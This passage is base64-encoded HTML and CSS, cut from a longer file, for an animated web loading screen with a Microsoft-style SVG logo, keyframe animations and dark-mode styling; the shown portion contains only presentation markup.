0aDogMTgwcHg7DQogICAgICAgICAgICAgICAgaGVpZ2h0OiAxODBweDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICNNU0xvZ28gew0KICAgICAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZDsNCiAgICAgICAgICAgICAgICBib3R0b206IDM2cHg7DQogICAgICAgICAgICAgICAgbGVmdDogY2FsYyg1MHZ3IC0gNDVweCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAuZGFyayAjbG9hZGluZ1NjcmVlbiB7DQogICAgICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzMzMzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICNsb2FkaW5nTG9nbzJfdHMgew0KICAgICAgICAgICAgICAgIGFuaW1hdGlvbjogbG9hZGluZ0xvZ28yX3RzX190cyAzMDAwbXMgbGluZWFyIDEgbm9ybWFsIGZvcndhcmRzOw0KICAgICAgICAgICAgICAgIGFuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6IDEwMDA7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAjbG9hZGluZ0xvZ28yIHsNCiAgICAgICAgICAgICAgICBhbmltYXRpb246IGxvYWRpbmdMb2dvMl9jX28gMzAwMG1zIGxpbmVhciAxIG5vcm1hbCBmb3J3YXJkczsNCiAgICAgICAgICAgICAgICBhbmltYXRpb24taXRlcmF0aW9uLWNvdW50OiAxMDAwOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI2xvYWRpbmdMb2dvM190byB7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBsb2FkaW5nTG9nbzNfdG9fX3RvIDMwMDBtcyBsaW5lYXIgMSBub3JtYWwgZm9yd2FyZHM7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDogMTAwMDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICNsb2FkaW5nTG9nbzZfdHMgew0KICAgICAgICAgICAgICAgIGFuaW1hdGlvbjogbG9hZGluZ0xvZ282X3RzX190cyAzMDAwbXMgbGluZWFyIDEgbm9ybWFsIGZvcndhcmRzOw0KICAgICAgICAgICAgICAgIGFuaW1hdGlvbi1pdGVyYXRpb24tY291bnQ6IDEwMDA7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAjbG9hZGluZ0xvZ284X3RzIHsNCiAgICAgICAgICAgICAgICBhbmltYXRpb246IGxvYWRpbmdMb2dvOF90c19fdHMgMzAwMG1zIGxpbmVhciAxIG5vcm1hbCBmb3J3YXJkczsNCiAgICAgICAgICAgICAgICBhbmltYXRpb24taXRlcmF0aW9uLWNvdW50OiAxMDAwOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgI2xvYWRpbmdMb2dvOV90byB7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uOiBsb2FkaW5nTG9nbzlfdG9fX3RvIDMwMDBtcyBsaW5lYXIgMSBub3JtYWwgZm9yd2FyZHM7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDogMTAwMDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgICNsb2FkaW5nTG9nbzI5X3RzIHsNCiAgICAgICAgICAgICAgICBhbmltYXRpb246IGxvYWRpbmdMb2dvMjlfdHNfX3RzIDMwMDBtcyBsaW5lYXIgMSBub3JtYWwgZm9yd2FyZHM7DQogICAgICAgICAgICAgICAgYW5pbWF0aW9uLWl0ZXJhdGlvbi1jb3VudDogMTAwMDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEBrZXlmcmFtZXMgbG9hZGluZ0xvZ28yX3RzX190cyB7DQogICAgICAgICAgICAgICAgMCUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDguODk0NDNweCwgMTU1LjcxNTEyN3B4KSBzY2FsZSgwLjY2ODk2MywgMC42Njg5NjMpOw0KICAgICAgICAgICAgICAgICAgICBhbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOiBjdWJpYy1iZXppZXIoMC40MiwgMCwgMC41OCwgMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIDI2LjY2NjY2NyUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDguODk0NDNweCwgMTU1LjcxNTEyN3B4KSBzY2FsZSgxLCAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMTAwJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwOC44OTQ0M3B4LCAxNTUuNzE1MTI3cHgpIHNjYWxlKDEsIDEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEBrZXlmcmFtZXMgbG9hZGluZ0xvZ28yX2NfbyB7DQogICAgICAgICAgICAgICAgMCUgew0KICAgICAgICAgICAgICAgICAgICBvcGFjaXR5OiAwOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAxOC4zMzMzMzMlIHsNCiAgICAgICAgICAgICAgICAgICAgb3BhY2l0eTogMTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMTAwJSB7DQogICAgICAgICAgICAgICAgICAgIG9wYWNpdHk6IDE7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQGtleWZyYW1lcyBsb2FkaW5nTG9nbzNfdG9fX3RvIHsNCiAgICAgICAgICAgICAgICAwJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDAxNTVweCwgMTk1Ljk3MDcwM3B4KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMTMuMzMzMzMzJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDAxNTVweCwgMTk1Ljk3MDcwM3B4KTsNCiAgICAgICAgICAgICAgICAgICAgYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogY3ViaWMtYmV6aWVyKDAsIDAsIDEsIDAuMDI1KTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMzElIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxLjAwMDE1NXB4LCAyMDZweCk7DQogICAgICAgICAgICAgICAgICAgIGFuaW1hdGlvbi10aW1pbmctZnVuY3Rpb246IGN1YmljLWJlemllcigwLjEzNSwgMC43MSwgMC4wMywgMC45ODUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICA1MCUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDEuMDAwMTU1cHgsIDE5NS45NzA3MDNweCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIDEwMCUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDEuMDAwMTU1cHgsIDE5NS45NzA3MDNweCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQGtleWZyYW1lcyBsb2FkaW5nTG9nbzZfdHNfX3RzIHsNCiAgICAgICAgICAgICAgICAwJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA3MDhweCwgOTcuNDk5NTg4cHgpIHNjYWxlKDEsIC0wLjAwMTcyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMjMuMzMzMzMzJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA3MDhweCwgOTcuNDk5NTg4cHgpIHNjYWxlKDEsIC0wLjAwMTcyKTsNCiAgICAgICAgICAgICAgICAgICAgYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogY3ViaWMtYmV6aWVyKDAuMTM1LCAwLjcxLCAwLjAzLCAwLjk4NSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIDQwJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA3MDhweCwgOTcuNDk5NTg4cHgpIHNjYWxlKDEsIDEpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAxMDAlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxLjAwMDcwOHB4LCA5Ny40OTk1ODhweCkgc2NhbGUoMSwgMSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQGtleWZyYW1lcyBsb2FkaW5nTG9nbzhfdHNfX3RzIHsNCiAgICAgICAgICAgICAgICAwJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA2OTlweCwgMTU5LjkxNDcyM3B4KSBzY2FsZSgxLCAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMzkuNjY2NjY3JSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA2OTlweCwgMTU5LjkxNDcyM3B4KSBzY2FsZSgxLCAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgNTAlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxLjAwMDY5OXB4LCAxNTkuOTE0NzIzcHgpIHNjYWxlKDEsIDEuMDUwMzYpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICA1Mi4zMzMzMzMlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxLjAwMDY5OXB4LCAxNTkuOTE0NzIzcHgpIHNjYWxlKDEsIDAuOTU5MjMzKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgNTcuNjY2NjY3JSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA2OTlweCwgMTU5LjkxNDcyM3B4KSBzY2FsZSgxLCAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMTAwJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA2OTlweCwgMTU5LjkxNDcyM3B4KSBzY2FsZSgxLCAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBAa2V5ZnJhbWVzIGxvYWRpbmdMb2dvOV90b19fdG8gew0KICAgICAgICAgICAgICAgIDAlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxcHgsIDIwNS43NTM3NjVweCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIDI2LjY2NjY2NyUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDFweCwgMjA1Ljc1Mzc2NXB4KTsNCiAgICAgICAgICAgICAgICAgICAgYW5pbWF0aW9uLXRpbWluZy1mdW5jdGlvbjogY3ViaWMtYmV6aWVyKDAuMTc1LCAwLjg4NSwgMC4zMiwgMS4yNzUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICA1MCUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDFweCwgODFweCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIDEwMCUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDFweCwgODFweCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgQGtleWZyYW1lcyBsb2FkaW5nTG9nbzI5X3RzX190cyB7DQogICAgICAgICAgICAgICAgMCUgew0KICAgICAgICAgICAgICAgICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgxMDEuMDAwNjk5cHgsIDk3LjQ5OTU3M3B4KSBzY2FsZSgxLCAxKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgMTMuMzMzMzMzJSB7DQogICAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKDEwMS4wMDA2OTlweCwgOTcuNDk5NTczcHgpIHNjYWxlKDEsIDEpOw0KICAgICAgICAgICAgICAgICAgICBhbmltYXRpb24tdGltaW5nLWZ1bmN0aW9uOiBjdWJpYy1iZXppZXIoMCwgMCwgMSwgMC4wMjUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAyMy4zMzMzMzMlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxLjAwMDY5OXB4LCA5Ny40OTk1NzNweCkgc2NhbGUoMSwgMC4wMDE3MjMpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAxMDAlIHsNCiAgICAgICAgICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGUoMTAxLjAwMDY5OXB4LCA5Ny40OTk1NzNweCkgc2NhbGUoMSwgMC4wMDE3MjMpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgPC9zdHlsZT4NCjwvaGVhZD4NCiA8ZGl2IGlkPSJsb2FkaW5nU2NyZWVuIiBzdHlsZT0iIj4NCiAgICAgICAgICAgICAgICAgICAgPHN2ZyBpZD0ibG9hZGluZ0xvZ28iIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHZpZXdCb3g9IjAgMCAyMjAgMjIwIiBzaGFwZS1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgdGV4dC1yZW5kZXJpbmc9Imdlb21ldHJpY1ByZWNpc2lvbiIgd2lkdGg9IjIyMCIgaGVpZ2h0PSIyMjAiPjxnIGlkPSJsb2FkaW5nTG9nbzJfdHMiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEwOC44OTQ0MzAsMTU1LjcxNTEyNykgc2NhbGUoMC42Njg5NjMsMC42Njg5NjMpIj48ZyBpZD0ibG9hZGluZ0xvZ28yIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTAwLjk5ODc0OSwtMTQxKSIgb3BhY2l0eT0iMCI+PGcgaWQ9ImxvYWRpbmdMb2dvM190byIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTAxLjAwMDE1NSwxOTUuOTcwNzAzKSI+DQogICAgICAgICAgICAgICAgICAgICAgICA8ZyBpZD0ibG9hZGluZ0xvZ28zIiBzdHlsZT0iZmlsdGVyOiBkcm9wLXNoYWRvdygwcHggNHB4IDBweCByZ2JhKDAsIDAsIDAsIDApKSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEwMS4wMDAxNTUsLTE5NS45NzA3MDMpIj4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIGlkPSJsb2FkaW5nTG9nbzQiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwYXRoIGlkPSJsb2FkaW5nTG9nbzUiIGQ9Ik0yMC45MzM3ODQsOTcuMjEwNjAwQzIwLjkzMzc4NCw5Ny4yMTA2MDAsMjAuMTc4MjcxLDkyLjk0MDA1MywyMC4wMjQwMDMsOTNMMTgyLjAxOTI1NSw5M0MxODIuMDE5MjU1LDkzLDE4Mi4wMTQwMDAsOTUuNTMxOTAwLDE4MS45OTkwMDAsOTcuMjEwNjAwQzE4Mi4wMjMwMDAsOTguOTA2NjAwLDE4MS4xNzcwMDAsMTAwLjQ5NjAwMCwxNzkuNzU5MDAwLDEwMS40MjEwMDBMMTA2LjY4NDAwMCwxNDUuOTk4MDAwTDEwNS43MzIwMDAsMTQ2LjU1OTAwMEMxMDQuMzM3MDAwLDE0Ny4zMDYwMDAsMTAyLjc3ODAwMCwxNDcuNjkxMDAwLDEwMS4xOTcwMDAsMTQ3LjY4MjAwMEM5OS42MzMzMDAsMTQ3LjY4OTAwMCw5OC4wOTMxMDAsMTQ3LjMwMzAwMCw5Ni43MTY5MDAsMTQ2LjU1OTAwMEw5NS43MDkwMDAsMTQ1Ljk5ODAwMEwyMi40MTAxMDAsMTAxLjQyMTAwMEMyMC45MDIxMDAsMTAwLjUzNTAwMCwyMi4zODE1ODUsOTguOTE2OTM3LDIwLjkzMzc4NCw5Ny4yMTA2MDBaIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIC0wLjAyMTgwMjk3NjMxMzM0IDMuOTk5OTk5OTk2NTk2NTMpIiBmaWxsPSJyZ2IoMTgsNTksMTA5KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcGF0aD4NCiAgICAgICAgICAgICAgICAgICAgICAgIDxnIGlkPSJsb2FkaW5nTG9nbzZfdHMiIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEwMS4wMDA3MDgsOTcuNDk5NTg4KSBzY2FsZSgxLC0wLjAwMTcyMCkiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwYXRoIGlkPSJsb2FkaW5nTG9nbzYiIGQ9Ik0xNzkuNzU5MDAwLDkzLjM3MzIwMEwxMDYuNTcyMDAwLDQ4Ljc0MDQwMEwxMDUuNjIwMDAwLDQ4LjEyMjgwMEMxMDQuMjE1MDAwLDQ3LjQwMzQwMCwxMDIuNjYzMDAwLDQ3LjAxOTEwMCwxMDEuMDg1MDAwLDQ3Qzk5LjUyNDYwMCw0Ny4wMTk2MDAsOTcuOTkwNzAwLDQ3LjQwNDEwMCw5Ni42MDQ5MDAsNDguMTIyODAwTDk1LjU5NzAwMCw0OC43NDA0MDBMMjIuMjk4MTAwLDkzLjMxNzAwMEMyMC44NzU1MDAsOTQuMjE4MTAwLDIwLjAwOTkwMCw5NS44MDQ5MTcsMjAuMDAyMjAwLDk3LjQ5MTkxN0MxOS45ODMzMDAsOTkuMjQ0MzE3LDIwLjkwMjEwMCwxMDAuODUyMDAwLDIyLjQxMDEwMCwxMDEuNzM4MDAwTDk1LjcwOTAwMCwxNDYuMzE1MDAwTDk2LjcxNjkwMCwxNDYuODc2MDAwQzk4LjA5MzEwMCwxNDcuNjIwMDAwLDk5LjYzMzMwMCwxNDguMDA2MDAwLDEwMS4xOTcwMDAsMTQ3Ljk5OTAwMEMxMDIuNzc4MDAwLDE0OC4wMDkwMDAsMTA0LjMzNzAwMCwxNDcuNjIzMDAwLDEwNS43MzIwMDAsMTQ2Ljg3NjAwMEwxMDYuNjg0MDAwLDE0Ni4zMTUwMDBMMTc5Ljc1OTAwMCwxMDEuNzM4MDAwQzE4MS4xNzcwMDAsMTAwLjgxMzAwMCwxODIuMDIzMDAwLDk5LjIyMzcwMCwxODEuOTk5MDAwLDk3LjUyNzcwMEMxODIuMDE0MDAwLDk1Ljg0OTAwMCwxODEuMTY4MDAwLDk0LjI4MDEwMCwxNzkuNzU5MDAwLDkzLjM3MzIwMFoiIHRyYW5zZm9ybT0idHJhbnNsYXRlKC0xMDEuMDAwNzA4LC05Ny40OTk1ODgpIiBmaWxsPSJyZ2IoMTgsNTksMTA5KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcGF0aD48L2c+PC9nPjxnIGlkPSJsb2FkaW5nTG9nbzciIGNsaXAtcGF0aD0idXJsKCNsb2FkaW5nTG9nbzIyKSI+PGcgaWQ9ImxvYWRpbmdMb2dvOF90cyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTAxLjAwMDY5OSwxNTkuOTE0NzIzKSBzY2FsZSgxLDEpIj48ZyBpZD0ibG9hZGluZ0xvZ284IiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMTAxLjAwMDY5OSwtMTU5LjkxNDcyMykiPjxnIGlkPSJsb2FkaW5nTG9nbzlfdG8iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDEwMSwyMDUuNzUzNzY1KSI+PGcgaWQ9ImxvYWRpbmdMb2dvOSIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoLTEwMSwtODEpIj48cGF0aCBpZD0ibG9hZGluZ0xvZ28xMCIgZD0iTTI4LDEwQzI4LDQuNDc3MTUwLDMyLjQ3NzIwMCwwLDM4LDBMMTY0LDBDMTY5LjUyMzAwMCwwLDE3NCw0LjQ3NzE1MCwxNzQsMTBDMTc0LDEwLDE3My45OTkzMDEsMjguMzU1MDA5LDE3My45OTkzMDEsMjguMzU1MDA5TDI4LDUxLjA2MDUyOUwyOCwxMFoiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMC4wMDA2OTkwNDAwMDAwMCAwKSIgZmlsbD0icmdiKDMsODgsMTY3KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcGF0aD48ZyBpZD0ibG9hZGluZ0xvZ28xMSI+PHJlY3QgaWQ9ImxvYWRpbmdMb2dvMTIiIHdpZHRoPSI1NC4wNjM4NjYiIGhlaWdodD0iNTAuMTE4MTE4IiByeD0iMCIgcnk9IjAiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMjggMjQuMDAwMDAwMDAwNjk3OTYpIiBmaWxsPSJyZ2IoMCwxMjAsMjEyKSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcmVjdD48cmVjdCBpZD0ibG9hZGluZ0xvZ28xMyIgd2lkdGg9IjQ2IiBoZWlnaHQ9IjUwLjExODExOCIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjA0MzgxNTI0ODk3MDk4IDAgMCAxIDEyNS45ODQ0OTg1NDczMzQ3NyAyNCkiIGZpbGw9InJnYig4MCwyMTcsMjU1KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcmVjdD48cmVjdCBpZD0ibG9hZGluZ0xvZ28xNCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwLjExODExOCIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDc4IDI0KSIgZmlsbD0icmdiKDQwLDE2OCwyMzQpIiBzdHJva2U9Im5vbmUiIHN0cm9rZS13aWR0aD0iMSI+PC9yZWN0PjwvZz48ZyBpZD0ibG9hZGluZ0xvZ28xNSI+PHJlY3QgaWQ9ImxvYWRpbmdMb2dvMTYiIHdpZHRoPSI1NC4wNjM4NjYiIGhlaWdodD0iNTAuNjU5MjY1IiByeD0iMCIgcnk9IjAiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgMjggNzApIiBmaWxsPSJyZ2IoMywxMDAsMTg0KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcmVjdD48cmVjdCBpZD0ibG9hZGluZ0xvZ28xNyIgd2lkdGg9IjQ2IiBoZWlnaHQ9IjUwLjY1OTI2NSIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgxLjA1MTExNzc2ODk5MDA0IDAgMCAxIDEyNS42NDg1ODI2MjY0NTgwOCA3MCkiIGZpbGw9InJnYig0MCwxNjgsMjM0KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcmVjdD48cmVjdCBpZD0ibG9hZGluZ0xvZ28xOCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwLjY1OTI2NSIgcng9IjAiIHJ5PSIwIiB0cmFuc2Zvcm09Im1hdHJpeCgxIDAgMCAxIDc4IDcwKSIgZmlsbD0icmdiKDAsMTIwLDIxMikiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIj48L3JlY3Q+PC9nPjxyZWN0IGlkPSJsb2FkaW5nTG9nbzE5IiB3aWR0aD0iNDYiIGhlaWdodD0iNDYiIHJ4PSIwIiByeT0iMCIgdHJhbnNmb3JtPSJtYXRyaXgoMS4wNTg4NTAwNjU1MzA3NCAwIDAgMSAxMjUuMjkyODk2OTg1NTg2MDggMTE2KSIgZmlsbD0icmdiKDAsMTIwLDIxMikiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIj48L3JlY3Q+PHJlY3QgaWQ9ImxvYWRpbmdMb2dvMjAiIHdpZHRoPSI1NC4wNjM4NjYiIGhlaWdodD0iNDYiIHJ4PSIwIiByeT0iMCIgdHJhbnNmb3JtPSJtYXRyaXgoMSAwIDAgMSAyOCAxMTYpIiBmaWxsPSJyZ2IoMjAsNjgsMTI1KSIgc3Ryb2tlPSJub25lIiBzdHJva2Utd2lkdGg9IjEiPjwvcmVjdD48cmVjdCBpZD0ibG9hZGluZ0xvZ28yMSIgd2lkdGg9IjUwIiBoZWlnaHQ9IjQ2IiByeD0iMCIgcnk9IjAiIHRyYW5zZm9ybT0ibWF0cml4KDEgMCAwIDEgNzggMTE2KSIgZmlsbD0icmdiKDMsMTAwLDE4NCkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIj48L3JlY3Q+PC9nPjwvZz48L2c+PC9nPjxjbGlwUGF0aCBpZD0ibG9hZGluZ0xvZ28yMiI+PHBhdGggaWQ9ImxvYWRpbmdMb2dvMjMiIGQ9Ik0yMC4wMDIyMDAsOTEuNjAzMDY3QzIwLjAwOTkwMCw4OS43MzA3MTgsMjAuODc1NTAwLDg3Ljk5MjEwNywyMi4yOTgxMDAsODYuOTkyMTE1TDE3OS43NTkwMDAsODcuMDU0Mzc5QzE4MS4xNjgwMDAsODguMDYwOTE5LDE4Mi4wMTQwMDAsODkuODAyMTkzLDE4MS45OTkwMDAsOTEuNjY1MzMxQzE4Mi4wMjMwMDAsOTMuNTQ3NjY5LDE4MS4xNzcwMDAsOTUuMzExNjk1LDE3OS43NTkwMDAsOTYuMzM4MzI1TDEwNi42ODQwMDAsMTQ1LjgxMjk2OUwxMDUuNzMyMDAwLDE0Ni40MzU2MDVDMTA0LjMzNzAwMCwxNDcuMjY0Njc4LDEwMi43NzgwMDAsMTQ3LjY5MTk3NywxMDEuMTk3MDAwLDE0Ny42ODE5ODhDOTkuNjMzMzAwLDE0Ny42ODk3NTgsOTguMDkzMTAwLDE0Ny4yNjEzNDgsOTYuNzE2OTAwLDE0Ni40MzU2MDVMOTUuNzA5MDAwLDE0NS44MTI5NjlMMjIuNDEwMTAwLDk2LjMzODMyNUMyMC45MDIxMDAsOTUuMzU0OTgwLDE5Ljk4MzMwMCw5My41NDgwMDIsMjAuMDAyMjAwLDkxLjYwMzA2N1oiIHRyYW5zZm9ybT0ibWF0cml4KDIuMjM0MzQwODkyNzM4OTIgMCAwIDMuNDMzMTE3NjYwMDQyNDQgLTEyNC42NjkyOTMwMjAyODkwOCAtMzIyLjAxMDA3MjQ0NDIwOTE5KSIgZmlsbD0icmdiKDE4LDU5LDEwOSkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PC9jbGlwUGF0aD48L2c+PGcgaWQ9ImxvYWRpbmdMb2dvMjQiIG1hc2s9InVybCgjbG9hZGluZ0xvZ28zMCkiPjxnIGlkPSJsb2FkaW5nTG9nbzI1Ij48cGF0aCBpZD0ibG9hZGluZ0xvZ28yNiIgZD0iTTE3MiwxODVMMjAsMTg1TDE4Miw5N0wxODIsMTc1QzE4MiwxODAuNTIzMDAwLDE3Ny41MjMwMDAsMTg1LDE3MiwxODVaIiBmaWxsPSJyZ2IoMjAsMTQ0LDIyMykiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PGcgaWQ9ImxvYWRpbmdMb2dvMjciPjxwYXRoIGlkPSJsb2FkaW5nTG9nbzI4IiBkPSJNMzAsMTg1TDE4MiwxODVMMjAsOTdMMjAsMTc1QzIwLDE4MC41MjMwMDAsMjQuNDc3MjAwLDE4NSwzMCwxODVaIiBmaWxsPSJyZ2IoNDAsMTY4LDIzNCkiIHN0cm9rZT0ibm9uZSIgc3Ryb2tlLXdpZHRoPSIxIj48L3BhdGg+PC9nPjwvZz48ZyBpZD0ibG9hZGluZ0xvZ28yOV90cyIgdHJhbnNmb3JtPSJ0cmFuc2xhdGUoMTAxLjAwMDY5OSw5Ny40OTk1NzMpIHNjYWxlKDEsMSkiPjxwYXRoIGlkPSJsb2FkaW5nTG9nbzI5IiBzdHlsZT0iZmlsdGVyOiBkcm9wLXNoYWRvdygNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAwcHggMHB4IDBweCByZ2JhKDAsIDAsIDAsIDAuMDkpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOyIgZD0iTTIyLjQwODEwMCwxMDEuNDIxMDAwQzIwLjkwMDIwMCwxMDAuNTM1MDAwLDE5Ljk4MTMwMCw5OC45MDY5MDAsMjAuMDAwMzAwLDk3LjE1NDUwMEMyMC4wMDc3MDAsOTUuNTAyMDAwLDIwLjgzODUwMCw5My45NjUyM